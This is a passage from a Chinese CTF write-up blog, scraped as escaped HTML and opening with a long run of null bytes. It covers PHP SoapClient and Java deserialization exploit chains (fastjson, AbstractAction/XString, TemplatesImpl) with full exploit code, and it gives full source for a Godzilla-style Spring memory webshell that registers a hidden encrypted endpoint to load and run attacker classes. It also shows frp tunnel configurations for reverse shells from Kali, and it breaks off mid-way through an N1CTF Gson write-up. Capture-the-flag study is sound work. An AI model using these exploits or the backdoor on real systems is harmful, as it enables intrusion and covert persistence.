\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\r\\n--0f9486e921f5468f9ab50745c4c93267--\\r\\n&quot;;try &#123; $a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;, &#x27;user_agent&#x27; =&gt; &quot;shanghe\\r\\n&quot; . &quot;Cookie: PHPSESSION=16aaab9fb\\r\\nContent-Type: multipart/form-data; boundary=&quot;.substr($postdata,2,32).&quot;\\r\\nConnection: keep-alive\\r\\nAccept: */*\\r\\nContent-Length: 10416&quot;.&quot;\\r\\n\\r\\n&quot;.$postdata, &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;));&#125; catch (SoapFault $e) &#123;&#125;$b = new siroha();$b-&gt;koi=[&quot;zhanjiangdiyishenqing&quot;=&gt;[$a,&quot;nnnnn&quot;]];echo urlencode(serialize($b)); 这 nm 真抽象，👴搞出来，自己都绷不住了. 但是👴打进去，文件被替换，那种终出的感觉，真√⑧爽！！！1 Ezfastjson shanhegiegie 出的黑盒 (大概) java, 刚好内容是我学过的，我可太喜欢了🥰🥰🥵 本地起个 msql_fake_server 1&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125; 读啥文件都行，除了 flag, 1&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///app/ezfastjson-0.0.1-SNAPSHOT.jar&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125; 源码鉴赏一波 你⛰🎁giegie 脑抽了 把 waf 写在了 parseObject 之后，那不直接打完反序列化漏洞再检测吗，跟没有一样. 所以可以直接打 JNDI, 不过这不是重点，重点是预期解，预期解的链子比较有意思. 这是黑名单，基本上是把 readobject 到 tostring 给 ban 了. 不过还有最终武器，👴马上就掏出来给你看看！！！ 就是 NEEPUCTF 中 Nomap 的那条链. Nomap 调用链 1234javax.swing.AbstractAction#readObject -&gt; javax.swing.AbstractAction#putValue -&gt; javax.swing.AbstractAction#firePropertyChange -&gt; java.lang.Object#equals 这 beyond÷ 玩意需要重写 writeObject, 那么改 writeObject 方法比较多，但是 javassist 貌似用不了，需要使用 agent 去修改. 谁都没有想到，我们至尊的大 B 老师使用本地重新写个一模一样的类去修改，yahari, 高端的方法往往只需要朴素的操作.🤣 看看 javax.swing.AbstractAction#readObject 参考文献😊 一条抽象的 equals 触发链 | Prove yourself (aecous.github.io) [NeepuCTF2023 公开赛 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](https://boogipop.com/2023/05/21/NeepuCTF2023 公开赛 Writeup/) 👴来看看怎么个事 调用链 1234javax.swing.AbstractAction#readObject -&gt; javax.swing.AbstractAction#putValue -&gt; javax.swing.AbstractAction#firePropertyChange -&gt; java.lang.Object#equals 这 beyond÷ 玩意需要重写 writeObject, 那么改 writeObject 方法比较多，但是 javassist 貌似用不了，需要使用 agent 去修改. 谁都没有想到，我们至尊的大 B 老师使用本地重新写个一模一样的类去修改，yahari, 高端的方法往往只需要朴素的操作.🤣 看看 javax.swing.AbstractAction#readObject 再看看 javax.swing.AbstractAction#putValue 触发 equals,equals 可以触发 Xstring 的 equals 从而调用任意 getters. 由于是抽象类，需要找到其子类 选择 AlignmentAction. writeObject AlignmentAction 在进行构造函数调用的时候，会不断向上去调用父类的方法 Action.NAME 为固定的 Name，name 为我们的第一参数 跟进 putValue 创建了 arrayTable , 把 Name 和 value 放入. 使用 alignmentAction.putValue ，将恶意键值也添加进 arrayTable 中. 随后 writeObject 写入序列化流 将键值对一次按队写入 readObject 会读取键值对，然后和之前一样，创建一个新的 ArrayTable 并且放入键值对. 但是如果一对键值对的 key 之前已经存入了该 key, 那么就会将该值赋值给 oldValue, 然后调用 firePropertyChange . 这里让 oldValue 为 Xstring , newValue 为 jsonnodes 即可. 要完成这个步骤，需要让 jsonnodes 的 key 和 Xstring 的 key 一致. 对此 Aecous 佬给出的方法简单粗暴，直接用 010 改文件的序列化数据 大 B 老师重写 wtireArrayTable 方法 123456789101112131415static void writeArrayTable(ObjectOutputStream s, ArrayTable table) throws IOException &#123; if (table != null &amp;&amp; table.getKeys((Object[])null) != null) &#123; int validCount = false; s.writeInt(3); s.writeObject(&quot;Name&quot;); s.writeObject(&quot;111&quot;); s.writeObject(&quot;key1&quot;); s.writeObject(table.get(&quot;key1&quot;)); s.writeObject(&quot;key1&quot;); s.writeObject(table.get(&quot;key2&quot;)); &#125; else &#123; s.writeInt(0); &#125; &#125; 不过这个方法我没打成功 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124import com.alibaba.fastjson.JSONArray;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import org.springframework.aop.framework.AdvisedSupport;import org.springframework.http.HttpEntity;import org.springframework.http.HttpHeaders;import org.springframework.http.ResponseEntity;import org.springframework.web.client.RestTemplate;import javax.management.BadAttributeValueExpException;import javax.swing.event.SwingPropertyChangeSupport;import javax.swing.text.StyledEditorKit;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.net.URI;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;public class exp2 &#123; public static void main(String[] args) throws Exception &#123; byte[] code= Files.readAllBytes(Paths.get(&quot;D:\\\\java\\\\bypassjava\\\\META-INF\\\\maven\\\\com.example\\\\bypassJava\\\\target\\\\classes\\\\gsl.class&quot;)); byte[][] codes=&#123;code&#125;; TemplatesImpl templatesImpl = new TemplatesImpl(); try &#123; setFieldValue(templatesImpl, &quot;_bytecodes&quot;, codes); setFieldValue(templatesImpl, &quot;_name&quot;, &quot;1llustrious&quot;); setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl()); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;); Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templatesImpl); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);// POJONode jsonNodes2 = new POJONode(templatesImpl);// BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);// Field val2 = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);// val2.setAccessible(true);// val2.set(exp2,jsonNodes2);// KeyPairGenerator keyPairGenerator;// keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);// keyPairGenerator.initialize(1024);// KeyPair keyPair = keyPairGenerator.genKeyPair();// PrivateKey privateKey = keyPair.getPrivate();// Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);// SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);// POJONode jsonNodes = new POJONode(signedObject); JSONArray jsonArray = new JSONArray(); jsonArray.add(proxyObj); XString xString = new XString(&quot;111&quot;); SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(&quot;11&quot;); StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction(&quot;111&quot;,1); Field field = Class.forName(&quot;javax.swing.AbstractAction&quot;).getDeclaredField(&quot;changeSupport&quot;); field.setAccessible(true); field.set(alignmentAction,swingPropertyChangeSupport); alignmentAction.putValue(&quot;key1&quot;,xString); alignmentAction.putValue(&quot;key2&quot;,jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);// objectOutputStream.writeUTF(&quot;NEEPU&quot;);// objectOutputStream.writeInt(1949); objectOutputStream.writeObject(alignmentAction); FileOutputStream fout=new FileOutputStream(&quot;1.ser&quot;); fout.write(barr.toByteArray()); fout.close();// try &#123;// unserialize(&quot;1.ser&quot;);// &#125; catch (Exception e) &#123;// throw new RuntimeException(e);// &#125; //System.out.println(serial(exp)); //deserial(serial(map)); //doPOST(exp.toString().getBytes());// FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;); //System.out.println(serial(exp)); //deserial(serial(map)); //doPOST(exp.toString().getBytes());// byte[] byt=new byte[fileInputStream.available()];// fileInputStream.read(byt);// doPOST(byt); &#125; private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123; Field f = obj.getClass().getDeclaredField(field); f.setAccessible(true); f.set(obj, arg); &#125; public static Object unserialize(String filename) throws Exception &#123; ObjectInputStream ois=new ObjectInputStream(Files.newInputStream(Paths.get(filename))); Object obj=ois.readObject(); return obj; &#125; public static void doPOST(byte[] obj) throws Exception&#123; HttpHeaders requestHeaders = new HttpHeaders(); requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);// URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;); URI url = new URI(&quot;http://localhost:8090/nomap&quot;); //URI url = new URI(&quot;http://localhost:8080/bypassit&quot;); HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders); RestTemplate restTemplate = new RestTemplate(); ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class); System.out.println(res.getBody()); &#125;&#125; 内存马 网上有很多内存马的写法，不过我整个有意思的. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class gsl extends AbstractTranslet &#123; public static Map&lt;String, Object&gt; store = new HashMap&lt;&gt;(); public static String xc=&quot;3c6e0b8a9c15224a&quot;; public static String pass=&quot;pass&quot;,md5; public static byte[] x(byte[] s, boolean m) &#123; try &#123; javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;); c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;)); return c.doFinal(s); &#125; catch (Exception e) &#123; return null; &#125; &#125; public static String md5(String s) &#123; String ret = null; try &#123; java.security.MessageDigest m; m = java.security.MessageDigest.getInstance(&quot;MD5&quot;); m.update(s.getBytes(), 0, s.length()); ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase(); &#125; catch (Exception e) &#123; &#125; return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123; Class base64; String value = null; try &#123; base64 = Class.forName(&quot;java.util.Base64&quot;); Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null); value = (String) Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e) &#123; try &#123; base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e2) &#123; &#125; &#125; return value; &#125; private static Class defineClass(byte[] classbytes) throws Exception &#123; URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class); method.setAccessible(true); return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length); &#125; public static byte[] base64Decode(String bs) throws Exception &#123; Class base64; byte[] value = null; try &#123; base64 = Class.forName(&quot;java.util.Base64&quot;); Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e) &#123; try &#123; base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e2) &#123; &#125; &#125; return value; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; md5 = md5(pass + xc); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = gsl.class.getMethod(&quot;ls1&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls1&quot;).options(config).build(); gsl readfile_inject = new gsl(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls1(HttpServletRequest request,HttpServletResponse response) throws Exception &#123; byte[] data=base64Decode(request.getParameter(pass)); data=x(data, false); try&#123; HttpSession session = request.getSession(); if (session.getAttribute(&quot;payload&quot;)==null)&#123; session.setAttribute(&quot;payload&quot;,defineClass(data)); &#125;else &#123; request.setAttribute(&quot;parameters&quot;,data); java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream(); Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance(); f.equals(arrOut); f.equals(request); response.getWriter().write(md5.substring(0,16)); f.toString(); response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true))); response.getWriter().write(md5.substring(16));&#125; &#125; catch (Exception e)&#123;&#125; &#125; &#125; 看着眼熟吗，没错，就是 godzilla🐎. 👴在广为流传的 Spring 内存🐎的基础上，引入了 godzilla🐎的逻辑. kali_tips 之后进行一波 MSF 上线，什么，你说 kali 不出网，没法反弹 shell?👴来告诉你怎么办. 首先你需要一个公网 IP,🤣🤣🤣🤣🤣 公网上起个 frps,frps.ini 如下 1234567891011121314[common]bind_port = 7000dashboard_user = admindashboard_pwd = frpadmin@2023dashboard_port = 7500heartbeat_timeout = 30token=frpToken@admin2023[common]server_addr = your_ip//这个ip是以目标靶机能访问到为准server_port = 7000vhost_http_port = 9001vhost_ssh_port = 9002vhost_tcp_port = 9003 然后确保 kali 能访问你的公网 ip, 接着 kali 起 frpc, 配置如下 12345678910111213141516171819202122232425262728293031[common]server_addr = ip//这个ip以kali能访问到为准server_port = 7000 token = frpToken@admin2023 [web]type = httplocal_ip = 0.0.0.0local_port = 80 custom_domains = ipremote_port = 9001 #kali ssh[ssh]type = tcplocal_ip = 0.0.0.0local_port = 22custom_domains = ipremote_port = 9002 #tcp msfconsole[tcp]type = tcplocal_ip = 0.0.0.0local_port = 9003custom_domains = ipremote_port = 9003 这里要注意到的是，frps 的服务 ip 和 frpc 的服务 ip 不一样. 在渗透的时候，往往是 windows 主机进入局域网，kali 不进，那么 frps 的 ip 配置就要以主机在局域网 ip 为准，而 frpc 的 ip 配置，以 NAT 模式配置的局域网为准. 然后 msf 生成反弹 shell 监听上线啥的就不成问题，不过 ip 要设置成映射后的 ip.","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]},{"title":"N1CTF_复现","slug":"N1CTF-复现","date":"2023-12-01T00:48:46.000Z","updated":"2023-12-02T00:13:46.186Z","comments":true,"path":"2023/12/01/N1CTF-复现/","link":"","permalink":"https://1llustrious.github.io/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"写在前面 StrangePort 分析🤔 gtmdapachemq 环境搭建 流程分析 分析如何利用到 createThrowable😊 Java Message Service(JMS) 打 tmd 题目😡 ez_maria 源码分析 UDF 写 so🤪 牛魔的什么事 capabilities 权限😓 其一 其二 劫持 php ytiruces ggbond’s gogs dockerdebug 写在前面 太顶了这比赛，还得复现学很多东西. 环境: GitHub - Nu1LCTF/n1ctf-2023 参考: [N1CTF 2023 Web 赛后复现 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](https://boogipop.com/2023/11/06/N1CTF 2023 Web 赛后复现 Writeup/#StrangePort) [N1CTF 2023 writeup (qq.com)](https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbond’s ggos) 2023n1ctf wp (qq.com) DJB!!!😝🥰 我可太喜欢大 B 老师了🥵, 受不了！！！1, 爆了！ StrangePort 开了个服务，通过 nginx 反代，题目不出网，md 就这么想恶心👴吗😅 题目给的 controller 12345678910111213141516171819202122232425262728293031323334//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.api;import com.google.gson.Gson;import java.nio.charset.StandardCharsets;import java.util.Base64;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RequestMapping(&#123;&quot;/api&quot;&#125;)public class APIController &#123; public APIController() &#123; &#125; @GetMapping(&#123;&quot;/&quot;&#125;) public String index() throws Exception &#123; return &quot;try /api/com.api.Person/eyJuYW1lIjoidXNlciIsImFnZSI6IjIwIn0=&quot;; &#125; @GetMapping(&#123;&quot;/&#123;Person&#125;/&#123;Json&#125;&quot;&#125;) public Person handleApiRequest(@PathVariable String Person, @PathVariable String Json) throws Exception &#123; Gson gson = new Gson(); Person person = (Person)gson.fromJson(new String(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person)); return person; &#125;&#125; 用自己√Ⅷ 想想都知道要通过 Gson 打一个 RCE. 分析🤔 不多说，先 debug 看一下能不能出点什么信息. 12345678910111213141516import com.api.Person;import com.google.gson.Gson;import java.lang.reflect.InvocationTargetException;import java.nio.charset.StandardCharsets;import java.util.Base64;public class GsonDemo &#123; public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123; String 